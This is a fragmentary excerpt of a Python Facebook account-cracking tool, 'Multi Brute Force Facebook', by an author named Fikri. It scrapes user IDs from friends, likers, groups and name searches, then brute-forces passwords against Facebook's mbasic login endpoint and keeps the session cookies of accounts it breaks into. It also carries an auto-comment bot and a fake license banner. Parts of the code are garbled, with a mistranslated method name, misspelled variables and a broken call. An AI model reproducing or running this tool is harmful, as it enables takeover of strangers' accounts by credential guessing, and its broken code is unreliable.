...
ip_log = Fikri * id_fik - 109184225

###----------[ GLOBAL URL & HEADERS ]---------- ###
url_businness = "https://business.facebook.com"
ua_business = "Mozilla/5.0 (Linux; Android 11; V2111) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36"
...
class bot_author:
    def __init__(self,cookie,token,cookie_mentah):
        self.loop = 0;self.cookie_mentah = cookie_mentah;list_id   = [str(Fikri)];self.komen = ['Mantap Bang','Semangat Terus','Gokil Suhu','Panutanku']
...
def poster():
    ...
    l6 = ('     %s Multi Brute Force Facebook %s%s %sBy %sFikri     '%(P,J,Version,P,J))
    print('%s\n%s\n%s\n%s\n%s\n%s'%(l1,l2,l3,l4,l5,l6))
def poster2():
    l1 = ('     %s  _________       __                          '%(P))
    ...
    l6 = ('     %s Multi Brute Force Facebook %s%s %sBy %sFikri     '%(P,H,Version,P,H))
    print('%s\n%s\n%s\n%s\n%s\n%s'%(l1,l2,l3,l4,l5,l6))
def poster3():
    l1 = ('     %s  _________       __                          '%(P))
    ...
    l6 = ('     %s Multi Brute Force Facebook %s%s %sBy %sFikri     '%(P,B,Version,P,B))
    print('%s\n%s\n%s\n%s\n%s\n%s'%(l1,l2,l3,l4,l5,l6))
...
def user(nama):
    ...
    print('        %s[%s•%s] %sYour License Will Expire In %s6 %sDays'%(J,P,J,P,A,P))
def tampilan_menu():
...
def pilih_menu():
    ...
    elif dc in ['2','02','b']  : tempel_sandi.append(Author);main_folls();system_login();metode();urut_crack();addpass();crack()
    elif dc in ['3','03','c']  : gabung_sandi.append(Author);namee()
    elif dc in ['4','04','d']  : tempel_sandi.append();main_likers();system_login();metode(Author);addpass();crack()
    elif dc in ['5','05','e']  : gabung_sandi.append(Author);message();system_login();metode();addpass();crack()
    elif dc in ['6','06','f']  : tempel_sandi.append(Author);komen();system_login();metode();addpass();crack()
    elif dc in ['7','07','g']  : gabung_sandi.append(Author);grup()
    elif dc in ['8','08','h']  : tempel_sandi.append(Author);hashtag();system_login();metode();addpass();crack()
    elif dc in ['9','09','i']  : gabung_sandi.append(Author);not_available('Dump ID Dari Beranda')
    elif dc in ['10','010','j']: tempel_sandi.append(Author);not_available('Dump ID Dari File')
    elif dc in ['11','011','k']: gabung_sandi.append(Author);not_available('Dump ID Dari Email')
    elif dc in ['12','012','l']: tempel_sandi.append(Auhtor);not_available('Dump ID Dari Username')
    elif dc in ['13','013','m']: gabung_sandi.append(Author);not_available('Dump ID Dari ID Random')
    elif dc in ['14','014','n']: tempel_sandi.append(Author);suggestion();system_login();metode();addpass();crack()
    elif dc in ['15','015','o']: gabung_sandi.append(Author);teman_teman()
    elif dc in ['16','016','p']: tempel_sandi.append(Author);not_available('Cek Hasil Crack')
    elif dc in ['17','017','q']: gabung_sandi.append(Author);not_available('Cek Opsi Akun Hasil Crack')
    elif dc in ['18','018','r']: tempel_sandi.append(Author);not_available('Cek Jumlah Teman Akun Target')
    elif dc in ['19','019','s']: gabung_sandi.append(Author);useragent('old')
    elif dc in ['20','020','t']: tempel_sandi.append(Author);not_available('Upgrade Ke Versi Pro')
    elif dc in ['0','00','z']:
        resik()
        poster3()
        print('')
...
class namee:
    def __init__(self):
        ...
        print('       %s[%s•%s] %sContoh : syafii,fikri,widiya'%(J,P,J,P))
        ...
        for set3 in data:url = 'https://mbasic.facebook.com/profile.php?ref_component=mbasic_home_header&ref_page=%2Fwap%2Fhome.php&refid=8'+set3;self.exec(url,cookie)
        self.lanjut()
                        ...
                        if "home.php" in str(temu["href"]):continue
                            ...
                            try:
                                if 'profile.php' in str(temu["href"]):
                                    ...
                                    if len(find) !=0:
                                        id   = ''.join(find)
                                        nama = temu.find("img").get("alt").replace(", profile php","")
...
def scrape_likers(_dapunta_,_url_,_file_):
    ...
    _url_load_ = _ses_.get(_url_,cookies=_dapunta_,headers=header_grup).text.Pengkodean("utf-8")
    ...
    with requests.Session() as xyz:
        if ip_log != 1:
            ...
            with requests.Session() as xyz:
                ...
                return {"status":"ok","email":user,"pass":pasw,"cookies":'fikrigantengbanget'}
        else:
...
def logger3(user,pasw): #--- Login Instagram ---#
    ...
    with requests.Session() as xyz:
        if ip_log != 1:
            ...
            log  = {"lsd":re.search('name="lsd" value="(.*?)"',str(req.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(req.text)).group(1),"email":user,"pass":pasw}
            head = {"Host":url_login,"origin":"https://"+url_login,"user-agent":ua,"sec-fetch-site":"same-origin"}
            exec = xyz.post(f'https://{url_login}/login/device-based/regular/login/?api_key=105432708823953&skip_api_login=1&signed_next=1&next=https://mbasic.facebook.com/dialog/oauth?app_id=105432708823953&refsrc=deprecated&app_id=105432708823953&lwv=100&refid=9', data=log, headers=head)
            if 'c_user' in xyz.cookies.get_dict(): return {"status":"ok","email":user,"pass":pasw,"cookies":xyz.cookies.get_dict()}
            elif 'checkpoint' in xyz.cookies.get_dict(): return {"status":"cp","email":user,"pass":pasw,"cookies":xyz.cookies.get_dict()}
            else: return {"status":"error","email":user,"pass":pasw}
...
###----------[ CONVERT COOKIES ]---------- ###
def cvt3(denventa):
    try:cookie = ('sb=%s;datr=%s;c_user=%s;xs=%s;fr=%s'%(fikri['sb'],fikrk['datr'],fikrk['c_user'],fikri['xs'],fikrk['fr']))
